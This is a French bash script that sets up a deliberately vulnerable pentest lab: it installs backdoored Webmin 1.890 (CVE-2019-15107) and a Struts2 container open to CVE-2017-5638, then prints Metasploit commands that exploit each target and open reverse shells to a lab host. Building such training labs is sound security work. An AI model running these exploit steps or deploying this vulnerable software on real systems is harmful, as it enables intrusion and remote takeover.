#!/bin/bash
set -e

echo "=========================================="
echo "  Installation DOUBLE - Webmin + Struts2"
echo "  Au moins un va marcher !"
echo "=========================================="
echo ""

if [ "$EUID" -ne 0 ]; then 
    echo "‚ùå Lance avec sudo"
    exit 1
fi

SERVER_IP=$(hostname -I | awk '{print $1}')

# ==========================================
# PARTIE 1 : WEBMIN 1.890 (Port 10000)
# ==========================================

echo ""
echo "=========================================="
echo "  [1/2] INSTALLATION WEBMIN 1.890"
echo "=========================================="
echo ""

WEBMIN_SUCCESS=0

echo "[1.1] Installation d√©pendances Webmin..."
apt-get update -qq > /dev/null 2>&1 || true
apt-get install -y wget perl libnet-ssleay-perl openssl libauthen-pam-perl > /dev/null 2>&1 || true

echo "[1.2] T√©l√©chargement Webmin 1.890..."
cd /tmp
rm -f webmin_1.890_all.deb

wget -q http://prdownloads.sourceforge.net/webadmin/webmin_1.890_all.deb 2>/dev/null || {
    echo "   ‚ö†Ô∏è  SourceForge √©chou√©, essai archive.org..."
    wget -q https://web.archive.org/web/20190818000000id_/http://prdownloads.sourceforge.net/webadmin/webmin_1.890_all.deb 2>/dev/null || {
        echo "   ‚ùå T√©l√©chargement Webmin √©chou√©"
    }
}

if [ -f "webmin_1.890_all.deb" ]; then
    echo "[1.3] Installation Webmin..."
    dpkg -i webmin_1.890_all.deb 2>/dev/null || {
        apt-get install -f -y > /dev/null 2>&1
        dpkg -i webmin_1.890_all.deb 2>/dev/null
    }
    
    if [ -f "/etc/webmin/miniserv.conf" ]; then
        /etc/init.d/webmin start 2>/dev/null || systemctl start webmin 2>/dev/null || true
        sleep 3
        
        if netstat -tlnp 2>/dev/null | grep -q ":10000 " || ss -tlnp 2>/dev/null | grep -q ":10000 "; then
            echo "   ‚úÖ Webmin install√© et actif sur port 10000"
            WEBMIN_SUCCESS=1
        else
            echo "   ‚ùå Webmin install√© mais ne d√©marre pas"
        fi
    else
        echo "   ‚ùå Installation Webmin √©chou√©e"
    fi
else
    echo "   ‚ùå Fichier Webmin introuvable"
fi


# ==========================================
# PARTIE 2 : STRUTS2 CVE-2017-5638 (Port 8080)
# ==========================================

echo ""
echo "=========================================="
echo "  [2/2] INSTALLATION STRUTS2"
echo "=========================================="
echo ""

STRUTS_SUCCESS=0

echo "[2.1] Nettoyage anciens containers..."
docker stop struts2-vuln 2>/dev/null || true
docker rm struts2-vuln 2>/dev/null || true
docker stop phpmyadmin-vuln 2>/dev/null || true
docker rm phpmyadmin-vuln 2>/dev/null || true

echo "[2.2] Pull image Struts2 vuln√©rable..."
docker pull vulnerables/cve-2017-5638 2>/dev/null || {
    echo "   ‚ö†Ô∏è  Image principale √©chou√©e, essai alternative..."
    docker pull piesecurity/apache-struts2-cve-2017-5638 2>/dev/null || {
        echo "   ‚ùå Aucune image Struts2 disponible"
    }
}

echo "[2.3] Lancement Struts2..."
docker run -d \
    --name struts2-vuln \
    --restart unless-stopped \
    -p 8080:8080 \
    vulnerables/cve-2017-5638 2>/dev/null || \
docker run -d \
    --name struts2-vuln \
    --restart unless-stopped \
    -p 8080:8080 \
    piesecurity/apache-struts2-cve-2017-5638 2>/dev/null || {
    echo "   ‚ùå Lancement Struts2 √©chou√©"
}

sleep 10

if docker ps 2>/dev/null | grep -q struts2-vuln; then
    echo "   ‚úÖ Struts2 install√© et actif sur port 8080"
    STRUTS_SUCCESS=1
else
    echo "   ‚ùå Struts2 non actif"
fi


# ==========================================
# R√âSUM√â FINAL
# ==========================================

echo ""
echo "=========================================="
echo "  üìä R√âSUM√â INSTALLATION"
echo "=========================================="
echo ""

if [ $WEBMIN_SUCCESS -eq 1 ]; then
    echo "‚úÖ Webmin 1.890"
    echo "   URL: https://${SERVER_IP}:10000/"
    echo "   CVE: CVE-2019-15107 (Backdoor)"
    echo "   Credentials: root / (password root serveur)"
else
    echo "‚ùå Webmin - Installation √©chou√©e"
fi

echo ""

if [ $STRUTS_SUCCESS -eq 1 ]; then
    echo "‚úÖ Apache Struts2"
    echo "   URL: http://${SERVER_IP}:8080/"
    echo "   CVE: CVE-2017-5638 (RCE)"
    echo "   Pas de credentials n√©cessaires"
else
    echo "‚ùå Struts2 - Installation √©chou√©e"
fi

echo ""

if [ $WEBMIN_SUCCESS -eq 0 ] && [ $STRUTS_SUCCESS -eq 0 ]; then
    echo "=========================================="
    echo "  ‚ùå √âCHEC TOTAL"
    echo "=========================================="
    echo ""
    echo "Les deux installations ont √©chou√©."
    echo "V√©rifie la connexion internet et les logs."
    exit 1
fi

echo "=========================================="
echo "  üî• EXPLOITATION METASPLOIT"
echo "=========================================="
echo ""

if [ $WEBMIN_SUCCESS -eq 1 ]; then
    echo "‚ñ∂ WEBMIN 1.890 (CVE-2019-15107):"
    echo ""
    echo "msfconsole -q"
    echo "use exploit/unix/webapp/webmin_backdoor"
    echo "set RHOSTS ${SERVER_IP}"
    echo "set RPORT 10000"
    echo "set SSL true"
    echo "set LHOST 192.168.100.10"
    echo "set LPORT 4444"
    echo "exploit"
    echo ""
fi

if [ $STRUTS_SUCCESS -eq 1 ]; then
    echo "‚ñ∂ STRUTS2 (CVE-2017-5638):"
    echo ""
    echo "msfconsole -q"
    echo "use exploit/multi/http/struts2_content_type_ognl"
    echo "set RHOSTS ${SERVER_IP}"
    echo "set RPORT 8080"
    echo "set TARGETURI /struts2-showcase/integration/saveGangster.action"
    echo "set LHOST 192.168.100.10"
    echo "set LPORT 4445"
    echo "exploit"
    echo ""
fi

echo "=========================================="
echo "  üìù SC√âNARIOS LAB"
echo "=========================================="
echo ""

if [ $WEBMIN_SUCCESS -eq 1 ]; then
    echo "Webmin: Panneau d'administration du serveur mail"
    echo "        Gestion users, logs, firewall, cron jobs"
    echo ""
fi

if [ $STRUTS_SUCCESS -eq 1 ]; then
    echo "Struts2: Portail intranet Iron4Software"
    echo "         Application Java RH/gestion interne"
    echo ""
fi

echo "=========================================="
echo "  ‚úÖ AU MOINS UNE CIBLE DISPONIBLE !"
echo "=========================================="
echo ""
